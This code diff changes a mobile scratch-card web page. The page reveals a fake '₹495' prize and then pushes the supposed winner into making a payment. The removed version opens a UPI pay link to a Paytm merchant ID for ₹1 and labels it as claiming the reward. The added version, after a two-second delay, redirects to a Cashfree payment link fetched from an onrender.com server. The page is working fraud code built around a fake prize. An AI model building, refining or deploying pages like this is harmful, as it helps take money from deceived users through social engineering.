@@ -12,7 +12,6 @@
       display: flex;
       flex-direction: column;
       align-items: center;
-      min-height: 100vh;
     }
     .top-img, .bottom-img {
       width: 100%;
@@ -29,7 +28,6 @@
       overflow: hidden;
       box-shadow: 0 10px 25px rgba(0,0,0,0.1);
       background: #fff;
-      margin: 15px 0;
     }
     .reward-layer {
       position: absolute;
@@ -57,7 +55,7 @@
     }
     @keyframes blink {
       0%, 100% { opacity: 1; }
-      50% { opacity: 0.7; }
+      50% { opacity: 0; }
     }
     canvas {
       position: absolute;
@@ -65,8 +63,6 @@
       top: 0;
       left: 0;
       border-radius: 25px;
-      cursor: pointer;
-      touch-action: none;
     }
     .scratch-text {
       position: absolute;
@@ -81,10 +77,8 @@
       font-size: 18px;
       font-weight: bold;
       animation: blink 2s infinite;
-      pointer-events: none;
     }
     .hidden { display: none; }
-    /* Modal */
     .modal {
       position: fixed;
       top: 0;
@@ -110,7 +104,6 @@
       border-radius: 16px;
       text-align: center;
       max-width: 90%;
-      width: 300px;
       box-shadow: 0 8px 20px rgba(0,0,0,0.2);
       animation: popup 0.3s ease-out;
     }
@@ -120,35 +113,11 @@
     }
     .modal-box h2 {
       font-size: 20px;
-      margin-bottom: 15px;
-      color: #d32f2f;
+      margin-bottom: 10px;
     }
     .modal-box p {
       font-size: 16px;
       color: #555;
-      margin-bottom: 20px;
-    }
-    .modal-btn {
-      background: #d32f2f;
-      color: white;
-      border: none;
-      padding: 12px 20px;
-      border-radius: 8px;
-      font-size: 16px;
-      font-weight: bold;
-      cursor: pointer;
-      transition: background 0.3s;
-    }
-    .modal-btn:hover {
-      background: #b71c1c;
-    }
-    .upi-id {
-      background: #f5f5f5;
-      padding: 10px;
-      border-radius: 8px;
-      font-family: monospace;
-      margin: 15px 0;
-      word-break: break-all;
     }
   </style>
 </head>
@@ -168,11 +137,8 @@
 <!-- Modal -->
 <div id="upiModal" class="modal">
   <div class="modal-box">
-    <h2>🎉 Congratulations! You won ₹495!</h2>
-    <p>Click below to claim your reward via UPI payment</p>
-    <div class="upi-id">merchant.upiid@okaxis</div>
-    <button class="modal-btn" id="payNowBtn">Pay Now via UPI</button>
-    <p style="font-size: 14px; margin-top: 15px;">If payment app doesn't open, copy UPI ID and pay manually</p>
+    <h2>🎉 बधाई हो! ₹495 जीते!</h2>
+    <p>Cashfree पेज पर ले जाया जा रहा है...</p>
   </div>
 </div>
 
@@ -185,16 +151,6 @@ const rewardAmount = document.getElementById("rewardAmount");
 const scratchText = document.getElementById("scratchText");
 const winSound = document.getElementById("winSound");
 const modal = document.getElementById("upiModal");
-const payNowBtn = document.getElementById("payNowBtn");
-
-// Merchant UPI details
-const upiDetails = {
-  pa: "paytmqr281005050101y6h4kwjia9ia@paytm",  // Replace with actual merchant UPI ID
-  pn: "Merchant Name",          // Replace with actual merchant name
-  am: "1",                    // Amount
-  tn: "Scratch Card Reward",    // Transaction note
-  cu: "INR"                     // Currency
-};
 
 // Set canvas size
 function resizeCanvas() {
@@ -215,7 +171,6 @@ function initScratchLayer() {
     ctx.drawImage(scratchLayer, 0, 0, canvas.width, canvas.height);
   };
   scratchLayer.onerror = () => {
-    // Fallback if scratch layer fails to load
     ctx.fillStyle = "#cccccc";
     ctx.fillRect(0, 0, canvas.width, canvas.height);
     ctx.fillStyle = "#999999";
@@ -239,20 +194,14 @@ function startScratch(x, y) {
   lastX = x;
   lastY = y;
   scratch(x, y, true);
-  try {
-    winSound.play().catch(e => console.log("Audio play failed:", e));
-  } catch (e) {
-    console.log("Audio error:", e);
-  }
+  try { winSound.play(); } catch (e) { console.log("Audio error:", e); }
 }
 
 function scratch(x, y, start = false) {
-  if (!ctx) return;
-  
   ctx.globalCompositeOperation = "destination-out";
   ctx.lineCap = "round";
   ctx.lineJoin = "round";
-  ctx.lineWidth = 25; // Smaller brush size for better control
+  ctx.lineWidth = 40;
   ctx.beginPath();
   if (start) ctx.moveTo(x, y);
   else {
@@ -265,8 +214,6 @@ function scratch(x, y, start = false) {
 }
 
 function getScratchedPercent() {
-  if (!ctx) return 0;
-  
   const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
   let cleared = 0;
   for (let i = 3; i < imgData.data.length; i += 4) {
@@ -276,37 +223,44 @@ function getScratchedPercent() {
 }
 
 function checkReveal() {
-  if (revealed || getScratchedPercent() < 40) return; // Increased threshold to 40%
+  if (revealed || getScratchedPercent() < 30) return;
   revealed = true;
   canvas.classList.add("hidden");
   scratchText.classList.add("hidden");
   rewardImage.classList.remove("hidden");
   rewardAmount.classList.remove("hidden");
-  
-  try {
-    winSound.play().catch(e => console.log("Audio play failed:", e));
-  } catch (e) {
-    console.log("Audio error:", e);
-  }
-  
+
+  try { winSound.play(); } catch (e) {}
+
   confetti({ particleCount: 200, spread: 70, origin: { y: 0.6 } });
 
+  // Show modal
   setTimeout(() => {
     modal.classList.add("show");
+
+    // Redirect to Cashfree after 2 sec
+    setTimeout(() => {
+      createCashfreeOrder();
+    }, 2000);
   }, 1000);
 }
 
-function initiateUPIPayment() {
-  // Standard UPI payment link
-  const upiLink = `upi://pay?pa=${upiDetails.pa}&pn=${encodeURIComponent(upiDetails.pn)}&am=${upiDetails.am}&tn=${encodeURIComponent(upiDetails.tn)}&cu=${upiDetails.cu}`;
-  
-  // Try to open directly
-  window.location.href = upiLink;
-  
-  // Fallback - open in new tab after delay
-  setTimeout(() => {
-    window.open(upiLink, '_blank');
-  }, 500);
+async function createCashfreeOrder() {
+  try {
+    const res = await fetch("https://papa-mode.onrender.com/create-order", {
+      method: "POST"
+    });
+    const data = await res.json();
+
+    if (data && data.payment_link) {
+      window.location.href = data.payment_link;
+    } else {
+      alert("Payment link not received.");
+    }
+  } catch (err) {
+    console.error("Error creating Cashfree order:", err);
+    alert("Payment error occurred.");
+  }
 }
 
 // Event listeners
@@ -314,15 +268,12 @@ canvas.addEventListener("mousedown", e => startScratch(...Object.values(getPosit
 canvas.addEventListener("mousemove", e => { if (!isDrawing) return; scratch(...Object.values(getPosition(e))); checkReveal(); });
 canvas.addEventListener("mouseup", () => isDrawing = false);
 canvas.addEventListener("mouseleave", () => isDrawing = false);
-canvas.addEventListener("touchstart", e => { startScratch(...Object.values(getPosition(e))); e.preventDefault(); });
+canvas.addEventListener("touchstart", e => startScratch(...Object.values(getPosition(e))));
 canvas.addEventListener("touchmove", e => { if (!isDrawing) return; scratch(...Object.values(getPosition(e))); checkReveal(); e.preventDefault(); });
 canvas.addEventListener("touchend", () => isDrawing = false);
 
-payNowBtn.addEventListener("click", initiateUPIPayment);
-
 // Preload images
 window.addEventListener('load', () => {
-  // Preload reward image
   const img = new Image();
   img.src = rewardImage.src;
 });
